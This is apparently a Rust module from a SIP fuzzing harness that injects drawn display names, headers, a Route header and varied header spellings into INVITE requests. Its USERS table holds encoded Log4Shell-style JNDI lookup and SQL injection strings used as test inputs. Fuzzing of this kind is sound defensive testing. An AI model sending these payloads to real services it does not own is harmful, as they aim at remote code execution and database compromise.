//! The fields of an initial INVITE a payload call draws into beyond its
//! extension headers: the From and To display names, the name-addr and
//! free-text headers the configuration names, a preloaded `Route` naming the
//! request's first hop, and the wire spelling of the headers the stack
//! writes. Every value is legal; the users the correlation and the routing
//! read are never drawn.

use scenario_harness::realcall::{quoted_len, InvitePlan};
use sip_message::header::{HeaderName, NameAddr, PAssertedIdentity, Uri};
use sip_message::sip_str::SipStr;

use crate::{chars, payload, FuzzConfig, Rng};

/// The headers the stack writes on an initial INVITE, with their compact
/// forms (RFC 3261 §7.3.3).
const STACK_HEADERS: &[(&str, Option<&str>)] = &[
    ("From", Some("f")),
    ("To", Some("t")),
    ("Via", Some("v")),
    ("Call-ID", Some("i")),
    ("Contact", Some("m")),
    ("Content-Type", Some("c")),
    ("Content-Length", Some("l")),
    ("CSeq", None),
    ("Max-Forwards", None),
];

/// The users an added name-addr header draws from when not all chars, with
/// their labels; a `:` is escaped, so none reads as a password.
pub(crate) const USERS: &[(&str, &str)] = &[
    ("+15550100", "number"),
    ("%24%7Bjndi%3Aldap%3A%2F%2F192.0.2.1%2Fa%7D", "jndi"),
    ("1555'%20OR%201=1--", "sql"),
    ("anonymous", "anonymous"),
];

/// Whether the stack writes a header `name` names on every initial INVITE, in
/// any spelling: a configured list never adds one.
pub fn stack_writes(name: &str) -> bool {
    let name = HeaderName::from(name);
    STACK_HEADERS.iter().any(|(canonical, _)| name.matches(canonical))
}

/// The host of every drawn identity URI (RFC 2606).
const HOST: &str = "example.com";

/// Each target `config` enables, drawn into `plan` one time in two inside
/// `config.header_budget`, named in `notes`.
pub fn draw(rng: &mut Rng, plan: &mut InvitePlan, config: &FuzzConfig, notes: &mut Vec<String>) {
    let targets = config.targets;
    if targets.from && rng.chance(50) {
        let (display, label) = payload::display(rng, config.all_chars);
        if fits(plan, config, quoted_len(&display) + 1) {
            plan.presentation.from_display = Some(display);
            notes.push(format!("from-dn:{label}"));
        }
    }
    if targets.to && rng.chance(50) {
        let (display, label) = payload::display(rng, config.all_chars);
        if fits(plan, config, quoted_len(&display) + 1) {
            plan.presentation.to_display = Some(display);
            notes.push(format!("to-dn:{label}"));
        }
    }
    for name in config.addr_headers {
        if rng.chance(50) {
            let (value, label) = name_addr(rng, config.all_chars);
            add(plan, config, name, value, format!("addr:{name}:{label}"), notes);
        }
    }
    for name in config.text_headers {
        if rng.chance(50) {
            let (value, label) = payload::text(rng, config.all_chars);
            add(plan, config, name, value, format!("text:{name}:{label}"), notes);
        }
    }
    if targets.route && rng.chance(50) {
        let param = if config.all_chars { chars::param(rng) } else { "%24%7Bjndi%7D".into() };
        let value = format!("<sip:{};lr;x-fz={param}>", plan.via);
        add(plan, config, "Route", value, "route-self".into(), notes);
    }
    if targets.names && rng.chance(50) {
        for _ in 0..1 + rng.below(3) {
            name_form(rng, plan, notes);
        }
    }
}

/// `name: value` added to `plan` when no header of that name, in any
/// spelling, is there or written by the stack, and the budget holds it.
fn add(
    plan: &mut InvitePlan,
    config: &FuzzConfig,
    name: &str,
    value: String,
    note: String,
    notes: &mut Vec<String>,
) {
    if stack_writes(name) || crate::perturb::holds(plan, name) {
        return;
    }
    if fits(plan, config, crate::perturb::header_bytes(name, &value)) {
        plan.headers.push((name.to_string(), value));
        notes.push(note);
    }
}

/// Whether `extra` more bytes keep `plan` inside the header budget.
fn fits(plan: &InvitePlan, config: &FuzzConfig, extra: usize) -> bool {
    let used: usize =
        plan.headers.iter().map(|(h, v)| crate::perturb::header_bytes(h, v)).sum::<usize>()
            + plan.presentation.display_bytes();
    used + extra <= config.header_budget
}

/// A name-addr value with a drawn display name and user:
/// (value, `<display label>/<user label>`).
fn name_addr(rng: &mut Rng, all_chars: bool) -> (String, String) {
    let (display, display_label) = payload::display(rng, all_chars);
    let (user, user_label) = if all_chars && rng.chance(50) {
        (chars::user(rng), "all-chars")
    } else {
        let (user, label) = *rng.pick(USERS);
        (user.to_string(), label)
    };
    let uri = Uri::parse(&SipStr::owned(&format!("sip:{user}@{HOST}")))
        .unwrap_or_else(|e| panic!("a drawn user is a SIP URI user: {user:?}: {e}"));
    let value = PAssertedIdentity::new(NameAddr::new(uri).with_display(display)).to_string();
    (value, format!("{display_label}/{user_label}"))
}

/// One stack header spelled compact or in a drawn case, unless a form names
/// it already.
fn name_form(rng: &mut Rng, plan: &mut InvitePlan, notes: &mut Vec<String>) {
    let (canonical, compact) = *rng.pick(STACK_HEADERS);
    let forms = &mut plan.presentation.name_forms;
    if forms.iter().any(|(c, _)| c == canonical) {
        return;
    }
    let wire = match compact {
        Some(short) if rng.chance(50) => short.to_string(),
        _ => canonical
            .chars()
            .map(|c| if rng.chance(50) { c.to_ascii_uppercase() } else { c.to_ascii_lowercase() })
            .collect(),
    };
    notes.push(format!("name:{canonical}={wire}"));
    forms.push((canonical.to_string(), wire));
}
